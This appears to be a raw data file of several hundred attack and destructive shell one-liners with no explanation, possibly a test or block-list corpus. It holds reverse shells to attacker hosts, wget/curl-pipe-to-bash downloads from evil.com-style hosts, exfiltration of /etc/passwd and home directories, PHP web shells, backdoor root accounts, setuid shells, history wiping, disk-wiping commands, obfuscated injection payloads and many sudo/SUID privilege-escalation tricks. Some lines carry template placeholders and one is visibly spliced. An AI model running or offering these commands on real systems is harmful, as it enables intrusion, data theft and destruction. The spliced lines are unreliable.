zip --symlinks archive.zip ../../../etc/passwd
rm -rf /
exiftool -Comment="<?php system($_POST['cmd']); ?>" backdoor.jpg
echo 'DELETE FROM users;' | mysql -u root -p
ln -s /etc/passwd badlink && tar -cvf archive.tar badlink
kill -9 -1
:(){ :|:& };:
TF=$(mktemp); echo 'Dpkg::Pre-Invoke {"/bin/sh;false"}' > $TF; sudo apt install -c $TF cowsay
wget http://evil.com/malware.sh -O- | bash
echo 'php -r "system($_GET[cmd]);"' > /var/www/html/shell.php
iptables -F
rm -rf --no-preserve-root /
chown -R root:root /
chmod -R 777 /
python3 -c "import os; os.system('rm -rf /')"
dd if=/dev/zero of=/dev/sda
find / -name '*' -delete
perl -e 'system("rm -rf /")'
mkfs.ext4 /dev/sda
curl -s http://malicious.site/script.sh | sh
abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat $abc
psql -o'|id>/tmp/foo'
echo 1/*$(sleep 5)`sleep 5`
$(tr '!-0' '"-1' <<< .)etc$(tr '!-0' '"-1' <<< .)passwd
'w'hoami
php -r 'echo shell_exec("ls");'
echo 1;sleep${IFS}5
echo $(cat /etc/passwd)
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
wh''oami
cat /etc/$(echo 'passwd')
cat${IFS}/etc/passwd
$(echo whoami)
echo '1;sleep${IFS}9;#${IFS}';sleep${IFS}9
eval "\$(curl http://mal.site/evil.sh)"
cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
$(base64 -d <<< Y2F0IC9ldGMvcGFzc3dk)
`echo whoami`
X=$'uname\x20-a'&&$X
echo "1;sleep${IFS}9;#${IFS}';sleep${IFS}9"
chmod 777 /etc/shadow
nc -e /bin/bash attacker.com 444
echo 'malicious_code' >> ~/.bashrc
ssh-keygen -f ~/.ssh/id_rsa -N ' '
export HISTFILE=/dev/null
cp /bin/bash /tmp/sh && chmod +s /tmp/sh
python3 -m http.server 8080 &
mv /etc/passwd /dev/null
chmod +s /bin/bash
adduser root2
curl http://attacker.com/evil.sh | bash
echo "*/1 * * * * root curl attacker.com/m.sh | sh" >> /etc/crontab
iptables -P INPUT ACCEPT && iptables -F
killall -9 sshd
useradd -ou 0 -g 0 backdoor
echo "root::0:0:root:/root:/bin/bash" >> /etc/passwd
cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash
rm -rf ~/.bash_history
unset HISTFILE
chmod u+s /usr/bin/find
nc -lvp 4444 -e /bin/sh
echo 'alias ls="rm -rf /"' >> ~/.bashrc
python -c 'import pty;pty.spawn("/bin/bash")'
perl -e 'exec "/bin/sh";'
( sleep 10 ; reboot ) &
ln -s / /tmp/root
cp /bin/sh /tmp/.hidden && chmod +s /tmp/.hidden
rm -rf ~/.ssh/
scp ~/.bash_history attacker@evil.com:/tmp/
history -c
cat /etc/passwd > /tmp/passwd.bak
find / -perm -4000
chmod 666 /etc/passwd
echo "nameserver 8.8.8.8" > /etc/resolv.conf
dd if=/dev/zero of=/dev/mem
mount -o bind / /mnt
cp /etc/shadow /tmp/shadow_copy
python3 -c "import os; os.system('rm -rf / --no-preserve-root')"
(while true; do :; done) &
rm -rf /*
touch /etc/cron.d/malcron
echo "root::0:0::/root:/bin/bash" >> /etc/passwd
wget http://evil.com/b.sh -O - | bash
openssl passwd -1 'toor' >> /etc/shadow
tcpdump -i any -w /tmp/capture.pcap &
dd if=/dev/random of=/dev/sda bs=512
echo "set +o history" >> ~/.bashrc
setenforce 0
systemctl stop firewalld
rm -i labrador.jpeg
sudo find / -name "*" -exec rm {} \;
mkfs.ext3 /dev/sdb
sh ./install.sh
! (( $RANDOM % 6 )) && rm -rf / || echo "You live"
echo 'os.execute("/bin/sh")' > /tmp/tf.lua
nmap --script=/tmp/tf.lua
bash -c 'ping -c 1 127.0.0.1; id'
dig ;cat /etc/passwd
sleep${IFS}5
nslookup $(whoami).x.oastify.com
tar --use-compress-program='sleep 5 ' -cf /tmp/etc_passwd.tar /etc/passwd
touch -- $user_input
rm -rf /var/log/*
echo "#!/bin/bash" > backdoor.sh && echo "rm -rf /" >> backdoor.sh
mkfs.vfat /dev/sdc1
bash -i >& /dev/tcp/attacker.com/8080 0>&1
> important_data.txt
dd if=/dev/zero of=/dev/null
cat /etc/passwd > exfil.txt
curl -T exfil.txt http://attacker.com/upload
cp /bin/bash /tmp/bsh && chmod +s /tmp/bsh
echo "<?php system($_GET['cmd']); ?>" > /var/www/html/shell.php
printf '#!/bin/bash\nrm -rf /' > /usr/local/bin/cleanup && chmod +x /usr/local/bin/cleanup
yes | mkfs.ext3 /dev/sdx
rm -rf ~/Downloads/*
bash -c "$(curl -fsSL http://evil.site/evil.sh)"
scp -r /etc attacker@evil.com:/tmp/etc
find / -type f -name '*.log' -delete
nmap --script=http-shellshock --script-args uri=/cgi-bin/test.cgi
tar cf archive.tar --use-compress-program="rm -rf /" /home/user
wget -q http://malicious.com/payload.sh -O- | bash
nc attacker.com 4444 -e /bin/bash
find /home -name "*" -exec rm -rf {} \;
rsync -a /etc attacker@evil.com:/tmp/etc
ln -s /etc/shadow /tmp/shadow_link
curl http://evil.site/$(whoami).sh | bash
python -c "import os; os.system('wget http://attacker.com/x.sh -O- | sh')"
touch "$(cat /tmp/user_input)"
find / -exec sh -c 'rm -rf {}' \;
perl -e 'system("mkfs.ext4 /dev/sda")'
xargs -a files.txt rm -rf
sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config
echo 'crash' > /proc/sysrq-trigger
logger "Injected by attacker"
tar -czf /tmp/home.tar.gz /home && curl -T /tmp/home.tar.gz http://attacker.com/
awk 'BEGIN { system("rm -rf /") }'
echo "$(whoami) connected" >> /etc/motd
mv /home/* /dev/nullawk 'BEGIN { system("rm -rf /") }'3025
cp /bin/sh /tmp/sh{0} && chmod +s /tmp/sh{0}
echo 'alias ls="rm -rf /"' >> ~/.bashrc{0}
wget http://attacker.com/payload{0}.sh -O- | bash
nc -e /bin/bash attacker.com {1}
rm -rf /var/log/*{0}
scp /etc/passwd attacker@evil.com:/tmp/p{0}
dd if=/dev/random of=/dev/sd{2} bs=512
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell{0}.php
chmod 666 /etc/shadow{0}
curl -T /etc/passwd http://attacker.com/upload{0}
python3 -c "import os; os.system('rm -rf ~')"{0}
touch /etc/cron.d/badjob{0}
printf '#!/bin/bash\nrm -rf /' > /usr/local/bin/clean{0} && chmod +x /usr/local/bin/clean{0}
echo 'set +o history' >> ~/.bashrc{0}
ln -s /etc/shadow /tmp/shadow_link{0}
find /home -name '*' -exec rm -rf {{}} \;{0}
rsync -a /etc attacker@evil.com:/tmp/etc{0}
perl -e 'system("mkfs.ext4 /dev/sd{2}")'{0}
bash -c 'ping -c 1 127.0.0.1; id'{0}
awk 'BEGIN {{ system("rm -rf /") }}'{0}
7z a -ttar -an -so $LFILE | 7z e -ttar -si -so
sudo 7z a -ttar -an -so $LFILE | 7z e -ttar -si -so
aa-exec /bin/sh
sudo install -m =xs $(which aa-exec) .
./aa-exec /bin/sh -p
sudo aa-exec /bin/sh
apt-get changelog apt
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
sudo apt-get install -c $TF sl
echo 'Dpkg::Pre-Invoke {"/bin/sh;false"}' > $TF
bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'
bash -c 'echo -e "POST / HTTP/0.9\n\n$(<$LFILE)" > /dev/tcp/$RHOST/$RPORT'
bash -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE'
bash -c 'enable -f ./lib.so x'
sudo install -m =xs $(which bash) .
cdist shell -s /bin/sh
sudo install -m =xs $(which batcat) .
batcat --paging always /etc/profile
bconsole -c /etc/shadow
rm *
busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'
c89 -wrapper /bin/sh,-s .
check_by_ssh -o "ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)" -H localhost -C xx
echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
csvtool call '/bin/sh;false' /etc/passwd
dc -e '!/bin/sh'
sudo install -m =xs $(which dc) .
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
System.Diagnostics.Process.Start("/bin/sh").WaitForExit();;
fpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF
echo 'import sys,socket,os,pty;s=socket.socket()
socat file:`tty`,raw,echo=0 tcp-listen:12345
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo install -m =xs $(which env) .
find . -exec /bin/sh \; -quit
find / -fprintf "$FILE" DATA -qui
gcc -wrapper /bin/sh,-s .
gcc -xc /dev/null -o $LFILE
gdb -nx -ex '!sh' -ex quit
gdb -nx -ex 'python import sys,socket,os,pty;s=socket.socket()
gdb -nx -ex 'python print(open("file_to_read").read())' -ex quit
gdb -nx -ex 'python from ctypes import cdll; cdll.LoadLibrary("lib.so")' -ex quit
./gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit
git diff /dev/null /path/to/file >x.patch
sudo PAGER='sh -c "exec sh 0<&1"' git -p help
sudo hping3 --icmp --listen xxx --dump
jrunscript -e "exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')"
jrunscript -e 'var host='"'""$RHOST""'"'; var port='"$RPORT"';
jrunscript -e 'br = new BufferedReader(new java.io.FileReader("file_to_read")); while ((line = br.readLine()) != null) { print(line); }'
VISUAL="/bin/sh -c '/bin/sh'" less /etc/profile
echo x | msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'
sudo install -m =xs $(which msgfilter) .
echo x | sudo msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'
mysql -e '\! /bin/sh'
mysql --default-auth ../../../../../path/to/lib
sudo install -m =xs $(which mysql) .
sudo install -m =xs $(which nano) .
nmap --script=$TF
echo 'os.execute("/bin/sh")' > $TF
openvpn --dev null --script-security 2 --up '/bin/sh -c sh'
./openvpn --dev null --script-security 2 --up '/bin/sh -p -c "sh -p"'
sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'
php -r '$p = array(array("pipe","r"),array("pipe","w"),array("pipe", "w"));$h = @proc_open(getenv("CMD"), $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'
php -r '$c=file_get_contents(getenv("URL"));file_put_contents(getenv("LFILE"), $c);'
sudo setcap cap_setuid+ep php
echo "open('$LFILE','w+').write('DATA')" > $TF/setup.py
rvim -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
rvim -c ':lua os.execute("reset; exec sh")'
socat file:`tty`,raw,echo=0 tcp-listen:12345
rvim -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary("lib.so"); vim.command(":q!")'
./rvim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
scp $RPATH $LFILE
script -q /dev/null
script -q -c 'echo DATA' file_to_write
sed -n '1e exec sh 1>&0' /etc/hosts
sed -n "1s/.*/DATA/w $LFILE" /etc/hosts
smbclient '\\attacker\share' -c 'put file_to_send where_to_save'
socat stdin exec:/bin/sh
socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane
socat TCP-LISTEN:$LPORT,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane
socat FILE:`tty`,raw,echo=0 TCP:target.com:12345
sqlite3 /dev/null '.shell /bin/sh'
sqlite3 /dev/null -cmd ".output $LFILE" 'select "DATA";'
sudo install -m =xs $(which sqlite3) .
sqlmap -u 127.0.0.1 --eval="import os; os.system('/bin/sh')"
ssh localhost $SHELL --noprofile --norc
ssh -o ProxyCommand=';sh 0<&2 1>&2' x
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh host
start-stop-daemon -n $RANDOM -S -x /bin/sh
sudo install -m =xs $(which start-stop-daemon) .
./start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p
strace -s 999 -o $LFILE strace - DATA
exec /bin/sh <@stdin >@stdout 2>@stderr
echo 'set s [socket $::env(RHOST) $::env(RPORT)];while 1 { puts -nonewline $s "> ";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh
mkfifo $TF && telnet $RHOST $RPORT 0<$TF | /bin/sh 1>$TF
tshark -Xlua_script:$TF
sudo vi -c ':!/bin/sh' /dev/null
view -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
view -c ':lua os.execute("reset; exec sh")'
view -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary("lib.so"); vim.command(":q!")'
./view -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
vimdiff -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
volatility -f file.dump volshell
__import__('os').system('/bin/sh')
echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF
wget --use-askpass=$TF 0
xdg-user-dir '}; /bin/sh #'
xdotool exec --sync /bin/sh
rm $TF
unzip -p $TF
./zip $TF /etc/hosts -T -TT 'sh #'
sudo zip $TF /etc/hosts -T -TT 'sh #'
cp /bin/sh $TF/zypper-x
nohup /bin/sh -c "sh <$(tty) >$(tty) 2>$(tty)"
echo "$COMMAND | tee $OUTPUT" > $TF
sed -n "1s/.*/DATA/w $LFILE" /etc/hosts
sysctl "kernel.core_pattern=|$COMMAND"
/usr/sbin/sysctl -n "/../../$LFILE"
tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
sudo wireshark -c 1 -i lo -k -f "udp port $PORT" &
echo 'DATA' | nc -u 127.127.127.127 "$PORT"
bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'
bash -c 'echo -e "POST / HTTP/0.9\n\n$(<$LFILE)" > /dev/tcp/$RHOST/$RPORT'
bash -c '{ echo -ne "GET /$LFILE HTTP/1.0\r\nhost: $RHOST\r\n\r\n" 1>&3; cat 0<&3; } \ 3<>/dev/tcp/$RHOST/$RPORT \ | { while read -r; do [ "$REPLY" = "$(echo -ne "\r")" ] && break; done; cat; } > $LFILE'
bash -c 'enable -f ./lib.so x'
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
nc -e /bin/sh $RHOST $RPORT
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s
openssl s_client -quiet -connect $RHOST:$RPORT < "$LFILE"
php -r '$h=@popen(getenv("CMD"),"r"); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'
php -r '$p = array(array("pipe","r"),array("pipe","w"),array("pipe", "w"));$h = @proc_open(getenv("CMD"), $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'
php -r '$sock=fsockopen(getenv("RHOST"),getenv("RPORT"));exec("/bin/sh -i <&3 >&3 2>&3");'
./php -r "pcntl_exec('/bin/sh', ['-p']);"
python -c 'import os; os.system("/bin/sh")'
python -c 'from ctypes import cdll; cdll.LoadLibrary("lib.so")'
vim --cmd ':set shell=/bin/sh|:shell'
nmap -p $RPORT $RHOST --script http-fetch --script-args http-fetch.destination=$TF,http-fetch.url=$LFILE
awk 'BEGIN {system("/bin/sh")}'
awk -v LPORT=$LPORT 'BEGIN { s = "/inet/tcp/" LPORT "/0/0"; while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break; while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
awk -v LFILE=$LFILE 'BEGIN { print "DATA" > LFILE }'
echo 'set s [socket $::env(RHOST) $::env(RPORT)];while 1 { puts -nonewline $s "> ";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | wish
node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
node -e 'require("http").get(process.env.URL, res => res.pipe(require("fs").createWriteStream(process.env.LFILE)))'
socket -qvp '/bin/sh -i' $RHOST $RPORT
nmap --interactive
curl -X POST -d "@$LFILE" $URL
curl "file://$TF" -o "$LFILE"
ftp $RHOST
